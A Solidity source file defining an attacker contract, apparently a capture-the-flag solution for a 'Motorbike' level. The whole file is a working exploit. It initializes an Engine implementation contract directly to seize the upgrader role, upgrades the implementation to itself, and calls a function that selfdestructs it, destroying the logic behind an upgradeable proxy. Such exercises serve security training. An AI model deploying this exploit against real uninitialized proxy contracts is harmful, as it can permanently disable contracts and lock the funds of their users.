// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface IEngine {
    function initialize() external;
    function upgradeToAndCall(address newImplementation, bytes memory data) external payable;
    function upgrader() external view returns (address);
}

contract MotorbikeAttacker {
    address public engineAddress;
    
    constructor(address _engineAddress) public {
        engineAddress = _engineAddress;
    }
    
    function attack() external {
        // First, initialize the Engine contract directly to become the upgrader
        IEngine(engineAddress).initialize();
        
        // Then upgrade to this contract and call the destroy function
        IEngine(engineAddress).upgradeToAndCall(
            address(this),
            abi.encodeWithSignature("destroy()")
        );
    }
    
    function destroy() external {
        selfdestruct(address(0));
    }
    
    // Helper function to get implementation address from proxy
    function getImplementation(address proxy) external view returns (address) {
        bytes32 _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
        address implementation;
        assembly {
            implementation := sload(_IMPLEMENTATION_SLOT)
        }
        return implementation;
    }
}